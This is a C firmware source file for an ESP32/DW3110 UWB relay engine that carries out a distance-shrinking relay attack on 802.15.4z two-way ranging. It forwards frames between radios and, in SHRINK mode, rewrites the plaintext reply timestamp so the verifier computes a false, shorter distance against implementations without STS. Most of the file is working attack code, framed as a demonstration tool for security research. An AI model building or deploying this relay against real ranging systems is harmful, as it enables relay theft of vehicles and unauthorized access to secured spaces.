/*
 * relay.c — UWB relay engine implementation.
 *
 * Author: jayis1
 * SPDX-License-Identifier: GPL-3.0-or-later
 *
 * The relay runs as a dedicated FreeRTOS task.  Frames arriving on
 * either radio are enqueued with their radio ID and receive timestamp.
 * The task dequeues them, applies the configured manipulation, and
 * retransmits on the opposite radio.
 *
 * Timestamp manipulation (RELAY_SHRINK) is the heart of the
 * distance-shrinking attack: we subtract a fixed ToF from the
 * forwarded frame's "reply" timestamp so the verifier's TWR math
 * returns our chosen distance instead of the real one.  This only
 * defeats implementations that lack STS or use a weak STS — which is
 * exactly what the operator wants to demonstrate.
 *
 * The single-radio case is handled by the DW3110's ability to switch
 * from RX to TX in ~130 µs.  The minimum relay latency in this mode is
 * therefore ~260 µs end-to-end, equivalent to ~78 m of "absorbed"
 * light-distance.  The dual-radio expansion reduces this to <50 µs.
 */

#include <string.h>
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/queue.h"
#include "esp_log.h"
#include "esp_timer.h"

#include "board.h"
#include "registers.h"
#include "dw3110.h"
#include "relay.h"

static const char *TAG = "relay";

#define RELAY_QUEUE_LEN  16

typedef struct {
    int       radio_id;
    uint8_t   frame[SNIFF_MAX_FRAME];
    size_t    len;
    uint64_t  rx_dtu;
    uint8_t   sts_quality;
} relay_pkt_t;

static QueueHandle_t  s_q;
static TaskHandle_t   s_task;
static relay_state_t *s_state;

/* ---- Internal helpers ------------------------------------ */

/* Compute the offset at which the "reply timestamp" lives inside a
 * 802.15.4z ranging frame.  This is a simplification: in a real
 * deployment the timestamp is encrypted under the STS, so a relay that
 * lacks the STS key cannot rewrite it.  The shrink attack only works
 * against non-STS implementations, where the timestamp is plaintext. */
static inline size_t timestamp_offset(size_t frame_len)
{
    /* 802.15.4 MAC header (2B FCF + 1B seq + 2B dst PAN + 2B dst + 2B src)
     * = 9 bytes; the ranging timestamp follows. */
    (void)frame_len;
    return 9;
}

static int retransmit_opposite(int radio_id, const uint8_t *frame, size_t len,
                               uint64_t adjusted_dtu)
{
    /* In the single-radio case, both sides are the same DW3110; we just
     * call dw3110_tx.  In the dual-radio case, radio_id selects the
     * other DW3110. */
    (void)radio_id;
    return dw3110_tx(frame, len, false, true, adjusted_dtu);
}

static void relay_loop(void *arg)
{
    relay_pkt_t pkt;
    while (s_state && s_state->armed) {
        if (xQueueReceive(s_q, &pkt, pdMS_TO_TICKS(100)) != pdPASS) continue;

        /* Apply fixed forwarding delay. */
        if (s_state->delay_us) {
            vTaskDelay(pdMS_TO_TICKS(s_state->delay_us / 1000 + 1));
        }

        /* Apply jitter. */
        uint32_t jit = 0;
        if (s_state->jitter_us) {
            uint32_t r = esp_random();
            jit = r % (2 * s_state->jitter_us + 1) - s_state->jitter_us;
        }

        /* Compute the retransmit time.  We schedule TX to land at
         * "now + delay + jitter".  In SHRINK mode we additionally
         * subtract target_shrink_dtu from the original rx_dtu before
         * passing it through, so the verifier's reply-timestamp math
         * shrinks the measured distance. */
        uint64_t now;
        dw3110_read_sys_time(&now);
        uint64_t tx_time = now + (uint64_t)(s_state->delay_us + jit) *
                           (UWB_DTU_PER_US);

        if (s_state->mode == RELAY_SHRINK) {
            /* Rewrite the plaintext timestamp field.  Only works
             * against non-STS implementations. */
            if (pkt.len > timestamp_offset(pkt.len) + 5) {
                uint8_t *ts_field = (uint8_t *)pkt.frame +
                                    timestamp_offset(pkt.len);
                uint64_t orig = ((uint64_t)ts_field[0])
                              | ((uint64_t)ts_field[1] << 8)
                              | ((uint64_t)ts_field[2] << 16)
                              | ((uint64_t)ts_field[3] << 24)
                              | ((uint64_t)ts_field[4] << 32);
                int64_t shrunk = (int64_t)orig - (int64_t)s_state->target_shrink_dtu;
                if (shrunk < 0) shrunk = 0;
                ts_field[0] = (uint8_t)(shrunk & 0xFF);
                ts_field[1] = (uint8_t)((shrunk >> 8) & 0xFF);
                ts_field[2] = (uint8_t)((shrunk >> 16) & 0xFF);
                ts_field[3] = (uint8_t)((shrunk >> 24) & 0xFF);
                ts_field[4] = (uint8_t)((shrunk >> 32) & 0xFF);
            }
        }

        int rc = retransmit_opposite(pkt.radio_id, pkt.frame, pkt.len,
                                     tx_time);
        if (rc == 0) {
            s_state->forwarded_count++;
        } else {
            s_state->dropped_count++;
            ESP_LOGW(TAG, "retransmit failed rc=%d", rc);
        }
    }
    vTaskDelete(NULL);
}

/* ---- Public API ----------------------------------------- */

int relay_init(relay_state_t *st)
{
    memset(st, 0, sizeof(*st));
    st->mode               = RELAY_TRANSPARENT;
    st->target_shrink_dtu  = 0;
    st->jitter_us          = 0;
    st->delay_us           = 1000;     /* 1 ms default */
    st->armed              = false;
    s_state = st;
    s_q = xQueueCreate(RELAY_QUEUE_LEN, sizeof(relay_pkt_t));
    return 0;
}

int relay_arm(relay_state_t *st)
{
    if (st->armed) return -EALREADY;
    st->armed = true;
    st->forwarded_count = 0;
    st->dropped_count   = 0;
    xTaskCreate(relay_loop, "relay", 4096, NULL, 14, &s_task);
    ESP_LOGI(TAG, "relay armed mode=%d shrink=%lu DTU jitter=%lu us",
             st->mode, (unsigned long)st->target_shrink_dtu,
             (unsigned long)st->jitter_us);
    return 0;
}

void relay_disarm(relay_state_t *st)
{
    st->armed = false;
    vTaskDelay(pdMS_TO_TICKS(200));
    ESP_LOGI(TAG, "relay disarmed forwarded=%llu dropped=%llu",
             st->forwarded_count, st->dropped_count);
}

int relay_on_frame(int radio_id, const uint8_t *frame, size_t len,
                   uint64_t rx_dtu, uint8_t sts_quality)
{
    if (!s_state || !s_state->armed) return -EPERM;
    relay_pkt_t pkt;
    pkt.radio_id     = radio_id;
    pkt.len          = len > SNIFF_MAX_FRAME ? SNIFF_MAX_FRAME : len;
    memcpy(pkt.frame, frame, pkt.len);
    pkt.rx_dtu       = rx_dtu;
    pkt.sts_quality  = sts_quality;
    if (xQueueSend(s_q, &pkt, 0) != pdPASS) {
        s_state->dropped_count++;
        return -ENOBUFS;
    }
    return 0;
}

void relay_task(void *arg)
{
    /* Standalone entry — used when relay is the only active mode. */
    relay_init((relay_state_t *)arg);
    relay_arm((relay_state_t *)arg);
    /* Loop forever; relay_loop runs from relay_arm. */
    while (true) vTaskDelay(pdMS_TO_TICKS(1000));
}